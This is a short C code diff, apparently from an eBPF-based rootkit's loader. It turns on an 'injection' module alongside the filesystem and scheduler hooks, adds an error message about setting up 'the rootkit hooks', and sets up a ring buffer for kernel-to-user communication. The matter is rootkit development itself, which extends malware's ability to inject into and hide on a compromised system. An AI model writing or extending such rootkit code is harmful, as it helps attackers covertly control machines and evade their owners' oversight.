@@ -402,9 +402,15 @@ int main(int argc, char**argv){
 	module_config.sched_module.all = ON;
 	//FS
 	module_config.fs_module.all = ON;
+
+	//INJECTION
+	module_config.injection_module.all = ON;
 	
 	module_config_attr.skel = skel;
 	err = setup_all_modules();
+	if(err!=0){
+		perror("ERROR setting up the rootkit hooks");
+	}
 
 	// Set up ring buffer polling --> Main communication buffer kernel->user
 	rb = ring_buffer__new(bpf_map__fd(skel->maps.rb_comm), handle_rb_event, NULL, NULL);
